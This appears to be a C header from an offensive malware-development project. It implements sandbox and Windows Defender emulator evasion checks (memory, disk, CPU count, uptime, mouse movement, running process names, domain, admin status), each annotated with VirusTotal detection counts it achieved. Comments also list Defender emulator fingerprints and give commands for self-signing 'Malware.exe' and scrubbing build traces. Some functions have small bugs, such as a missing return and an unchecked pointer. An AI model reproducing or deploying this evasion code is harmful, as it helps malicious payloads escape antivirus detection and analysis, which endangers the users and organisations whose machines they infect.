/*--------------------------------------------------------------------
                        --- Ideas ---
    Malware Course (https://0xpat.github.io/Malware_development_part_2/)
    Check if mpenginde.dll or other defender related files are there.
    In Sandbox "Administrator" is "Administrators"
    Empty DNS or ARP Cache
    Not the same kernel
    Mouse position + Start Screensaver
    Keyboard Usage
    Mobile Sensors
    Check BrowserCache or something like that
    Let your Malware do legit work
    
    Anti-Defender Talk (https://i.blackhat.com/us-18/Thu-August-9/us-18-Bulazel-Windows-Offender-Reverse-Engineering-Windows-Defenders-Antivirus-Emulator.pdf)
    Define own entrypoint
    Check if own binary name is myapp.exe (Defender)
    Check if icq.exe, antivirus.exe, myapp.exe, wmplayer.exe is running (Defender)
    Check if username is JohnDoe (Defender)
    Check if Computername is HAL9TH (Defender)
    Check if following functions exists in kernel32.dll (Defender)
        MpReportEventEx
        MpReportEventW
        MpSetSelectorBase
        UnimplementedAPIStub
        MpAddToScanQueue
        MpCreateMemoryAliasing
        MpReportEvent
    Check if following functions exists in ntdll.dll
        VFS_DeleteFileByHandle 
        VFS_FileExists 
        VFS_FindClose 
        VFS_FindFirstFile 
        VFS_FindNextFile 
        VFS_FlushViewOfFile 
        VFS_GetAttrib 
        VFS_GetHandle 
        VFS_GetLength 
        VFS_MapViewOfFile 
        VFS_MoveFile 
        VFS_Open
        VFS_Read
        VFS_SetAttrib
        VFS_SetCurrentDir
        VFS_SetLength
        VFS_UnmapViewOfFile
        VFS_Write
        ObjMgr_ValidateVFSHandle
        ThrdMgr_GetCurrentThreadHandle
        ThrdMgr_SaveTEB
        ThrdMgr_SwitchThreads
        VFS_CopyFile
        VFS_DeleteFile
        MpGetSelectorBase
        MpUfsMetadataOp
        NtControlChannel
--------------------------------------------------------------------*/


#pragma once


#include <windows.h>
#include <securitybaseapi.h>
#include <tlhelp32.h>
#include <stdio.h>
//#include <secext.h>
#include <intrin.h>
#include <sysinfoapi.h>
#include <shlobj_core.h>

#define SECURITY_WIN32
#define __WIN32_WINNT 0x0A00
#define MAX_BUFFER_SIZE 512

/*--------------------------------------------------------------------
  - Remove pdb Path and Strings with Hexeditor.
    PDB (Program Database) path is embedded in the binary by default when using Visual Studio. 
    PDB is used for storing debugging information and the file is stored in the same directory as the executable (or DLL) itself. 
    This path can give away some sensitive infomation - just imagine something like 
    "C:\users\nameSurname\Desktop\companyName\clientName\assessmentDate\MaliciousApp\Release\app.exe".
    This can be achieved by switching build configuration to "Release" and disabling generation of debug information (linker configuration in project properties).
    Eigenschaften -> Linker -> Debuginfo generieren = Nein

  - Disable optimization in Projekt Properties (Visual Studio). Eigenschaften, Optimierung. 

  - Sign the malware. 

        where /R "C:\Program Files (x86)\Windows Kits" makecert.*

        "C:\Program Files (x86)\Windows Kits\10\bin\10.0.18362.0\x64\makecert.exe" -r -pe -n "CN=Selfmade CA" -ss CA -sr CurrentUser -a sha256 -cy authority -sky signature -sv SelfmadeCA.pvk SelfmadeCA.cer
        "C:\Program Files (x86)\Windows Kits\10\bin\10.0.18362.0\x64\makecert.exe" -pe -n "CN=Selfmade Cert" -a sha256 -cy end -sky signature -ic SelfmadeCA.cer -iv SelfmadeCA.pvk -sv SelfmadeCert.pvk SelfmadeCert.cer
        "C:\Program Files (x86)\Windows Kits\10\bin\10.0.18362.0\x64\pvk2pfx.exe" -pvk SelfmadeCert.pvk -spc SelfmadeCert.cer -pfx SelfmadeCert.pfx
        "C:\Program Files (x86)\Windows Kits\10\bin\10.0.18362.0\x64\signtool.exe" sign /v /f SelfmadeCert.pfx /t http://timestamp.verisign.com/scripts/timstamp.dll Malware.exe

        ! Executable signing can be configured as Post-Build Event in Visual Studio Project properies
        "C:\Program Files (x86)\Windows Kits\10\bin\10.0.18362.0\x64\signtool.exe" sign /v /f \\share.local\ShareLocal\hacking\toolz\ShellcodeExecution\SelfmadeSPC.pfx /t http://timestamp.verisign.com/scripts/timstamp.dll $(TargetPath)


  - Rename the Binary to cmd.exe or calc.exe when testing.

  - set #pragma comment(lib, "kernel32.lib") manually and remove from Visual Studio: 
    Eigenschaften -> Linker -> Alle Optionen -> Zusätzliche Abhängigkeiten - Remove kernel32.dll und %(AdditionalDependencies)
--------------------------------------------------------------------*/


/*--------------------------------------------------------------------
                        --- Virus Total ---
  Before: 4/67
  After: 4/67
--------------------------------------------------------------------*/
#include <memoryapi.h>
BOOL VirtualAllocExNumaEmuCheck() {
    LPVOID mem = VirtualAllocExNuma(GetCurrentProcess(), NULL, 1, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE, 0);
    if (mem == NULL)
    {
        return FALSE;
    }
    return TRUE;
}



/*--------------------------------------------------------------------
                    --- Virus Total ---
  Before: 4/67
  After: 2/67
--------------------------------------------------------------------*/
#include <BluetoothAPIs.h>
#pragma comment(lib, "Bthprops.lib")
BOOL BluetoothEnabelDiscoveryEmuCheck() {
    HANDLE hRadio = NULL;
    BOOL bRes = BluetoothEnableDiscovery(hRadio, TRUE);
    if (bRes == NULL)
    {
        return FALSE;
    }
    return TRUE;
}




/*--------------------------------------------------------------------
                --- Virus Total ---
Before: 4/67
After: 3/67
--------------------------------------------------------------------*/
#include <fibersapi.h>
BOOL FlsAllocEmuCheck() {
    PFLS_CALLBACK_FUNCTION fls = NULL;
    DWORD dwRes = FlsAlloc(fls);
    if (dwRes == NULL)
    {
        return FALSE;
    }
    return TRUE;
}

/*--------------------------------------------------------------------
            --- Virus Total ---
Before: 4/67
After: 3/67
--------------------------------------------------------------------*/

BOOL CheckTime(DWORD dwSleepTime) {
    SYSTEMTIME st1;
    GetSystemTime(&st1);
    Sleep(dwSleepTime);
    SYSTEMTIME st2;
    GetSystemTime(&st2);
    USHORT diff = st2.wSecond - st1.wSecond;
    if (diff <= 4)
    {
        GetSystemTime(&st1);
        Sleep(dwSleepTime);
        GetSystemTime(&st2);
        diff = st2.wSecond - st1.wSecond;
        if (diff <= 4)
        {
            GetSystemTime(&st1);
            Sleep(dwSleepTime);
            GetSystemTime(&st2);
            diff = st2.wSecond - st1.wSecond;
            if (diff <= 4)
            {
                GetSystemTime(&st1);
                Sleep(dwSleepTime);
                GetSystemTime(&st2);
                diff = st2.wSecond - st1.wSecond;
                if (diff <= 4)
                {
                    return FALSE;
                }
            }
        }
    }
    return TRUE;
}

BOOL SleepLong(DWORD dwSleepTime) 
{
    DWORD dwStart = GetTickCount();
    SleepEx(dwSleepTime, FALSE);
    DWORD dwEnd = GetTickCount();
    if (dwEnd - dwStart >= dwSleepTime) {
        return TRUE;
    }
}


/*--------------------------------------------------------------------
            --- Virus Total ---
Before: 4/67
After: -/67
--------------------------------------------------------------------*/

BOOL CheckDomain(WCHAR* domain) {
    // NetGetJoinInformation which establish network connection

    WCHAR buffer[MAX_BUFFER_SIZE];
    GetEnvironmentVariable(L"USERDOMAIN", buffer, 256);
    BOOL bResult = FALSE;
    DWORD dwSize = MAX_BUFFER_SIZE;
    WCHAR* position = wcsstr(buffer, L"\\");

    position[0] = 0x00;
    if (wcscmp(domain, buffer) == 0) {
        bResult = TRUE;
    }

    return bResult;
}

/*--------------------------------------------------------------------
            --- Virus Total ---
Before: 4/67
After: 2/67 - 4096MB
After: 1/67 - 8200MB
--------------------------------------------------------------------*/
BOOL CheckMemory(DWORD dwSize) {
    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    GlobalMemoryStatusEx(&memoryStatus);
    DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
    if (RAMMB < dwSize)
    {
        return FALSE;
    }
    return TRUE;
}

/*--------------------------------------------------------------------
            --- Virus Total ---
Before: 4/67
After: 2/67 - 50GB
After: 2/67 - 1GB
After: 2/67 - 200GB

Guess sandboxes can not create this file. 
CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
--------------------------------------------------------------------*/
BOOL CheckDisk(DWORD dwSize) 
{
    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    DISK_GEOMETRY pDiskGeometry;
    DWORD bytesReturned;
    DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
    DWORD diskSizeGB;
    diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
    if (diskSizeGB < dwSize)
    {
        return FALSE;
    }
    return TRUE;
}




BOOL CheckCPU(DWORD contains) {
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
    if (numberOfProcessors < contains)
    {
        return FALSE;
    }
    return TRUE;
    
    /* https://en.wikipedia.org/wiki/CPUID
    BOOL bResult = FALSE;
    int index[4];

    
    DWORD64 *index;
    index = GlobalAlloc(GPTR, sizeof(DWORD64) * 4);
    
    int id = 0;
    __cpuid(index, id);
    if (index[1] == contains) {
        bResult = TRUE;
    }

    
    int level; 0;

    asm("cpuid\n\t"
        : "=a" (index[0]), "=b" (index[1]), "=c" (index[2]), "=d" (index[3])
        : "0" (level)
    );
    

    return bResult;*/
}



/*--------------------------------------------------------------------
            --- Virus Total ---
Before: 4/67
After: 2/67 - myapp.exe
After: 2/67 - antivirus.exe
After: 2/67 - icq.exe

Most of the applications evade Defender.
Check if icq.exe, antivirus.exe, myapp.exe, wmplayer.exe is running(Defender).
Anti-Defender Talk (https://i.blackhat.com/us-18/Thu-August-9/us-18-Bulazel-Windows-Offender-Reverse-Engineering-Windows-Defenders-Antivirus-Emulator.pdf)

Implement more. Check for absence of files.
https://evasions.checkpoint.com/techniques/filesystem.html

Build to take a list of applications.
--------------------------------------------------------------------*/
BOOL CheckRunningApp(LPCWSTR name)
{
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process;
    ZeroMemory(&process, sizeof(process));
    process.dwSize = sizeof(process);
    if (Process32First(snapshot, &process))
    {
        do
        {
            if (wcscmp(process.szExeFile, name) == 0)
            {
                return TRUE;
                break;
            }
        } while (Process32Next(snapshot, &process));
    }
    CloseHandle(snapshot);
    return FALSE;
}

/*--------------------------------------------------------------------
            --- Virus Total ---
Before: 4/67
After: 3/67
--------------------------------------------------------------------*/
BOOL checkScreenResolution()
{
    int h = GetSystemMetrics(SM_CYFULLSCREEN);
    if (h < 720)
    {
        return FALSE;
    }
    return TRUE;
}

/*--------------------------------------------------------------------
            --- Virus Total ---
Before: 4/67
After: 1/67

Targets where user is not an admin for sure. 
--------------------------------------------------------------------*/
BOOL isAdmin()
{
    if (IsUserAnAdmin())
    {
        return FALSE;
    }
    return TRUE;
}

/*--------------------------------------------------------------------
            --- Virus Total ---
Before: 4/67
After: 5/67
--------------------------------------------------------------------*/
BOOL isTimeAliveGreater()
{
    // System uptime
    // We are using GetTickCount64
    // Retrieves the number of milliseconds that have elapsed since the system was started.
    // https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-gettickcount64
    if (GetTickCount() < (300000)) // 5 min; 5*60=300 sec; 5*60*1000=300000 msec
    {
        return FALSE;
    }
    return TRUE;
}

/*--------------------------------------------------------------------
            --- Virus Total ---
Before: 4/67
After: 2/67
--------------------------------------------------------------------*/
BOOL chkOfficeRegKey() 
{
    HKEY hkResult = NULL;
    TCHAR lpSubKey[] = L"SOFTWARE\\Microsoft\\Office";
    HKEY hKey = HKEY_CURRENT_USER;
    if (RegOpenKeyEx(hKey, lpSubKey, NULL, KEY_ALL_ACCESS, &hkResult) == ERROR_SUCCESS)
    {
        return TRUE;
    }
    else
    {
        return FALSE;
    }
}


/*--------------------------------------------------------------------
            --- Virus Total ---
Before: 4/67
After: 4/67
--------------------------------------------------------------------*/
BOOL checkMousePosition()
{
    POINT pos1, pos2;
    GetCursorPos(&pos1);
    Sleep(13000);
    GetCursorPos(&pos2);
    if ((pos1.x == pos2.x) && (pos1.y == pos2.y))
    {
        return FALSE;
    }
    return TRUE;
}